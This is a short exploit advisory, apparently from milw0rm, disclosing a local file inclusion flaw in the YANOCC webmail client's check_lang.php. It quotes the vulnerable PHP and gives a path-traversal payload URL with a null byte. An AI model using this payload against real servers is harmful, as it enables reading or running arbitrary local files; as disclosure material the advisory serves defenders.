@@ -1,0 +1,38 @@
+Yet Another NOCC 0.1.0 <= Local File Inclusion Vulnerabilities
+
+YANOCC is a simple and fast webmail client which can handle POP3, SMTP, and IMAP servers. 
+YANOCC is based on NOCC's code and is written with PHP4. It features multi-language support, 
+MIME attachments, displays HTML messages, address book, folder support.
+
+Author: Kacper
+HomePage: http://devilteam.pl/
+          http://polskihacking.pl/
+
+in file check_lang.php:
+
+if (!ISSET($lang))
+{
+	$ar_lang = explode(",", $HTTP_ACCEPT_LANGUAGE);
+	while ($accept_lang = array_shift($ar_lang))
+	{
+		$tmp = explode(";", $accept_lang);
+		$tmp[0] = strtolower($tmp[0]);
+		if (file_exists("lang/".$tmp[0].".php"))
+		{
+			$lang = $tmp[0];
+			break;
+		}
+	}
+	if ($lang == "")
+		$lang = $default_lang;
+}
+//  Fix for faulty PHP install (RH7, see bug #24933)
+$lang = trim($lang);
+require ("lang/".$lang.".php");
+
+Vuln example:
+
+check_lang.php?lang=../[localinclude]%00
+
+
+# milw0rm.com [2009-02-09]
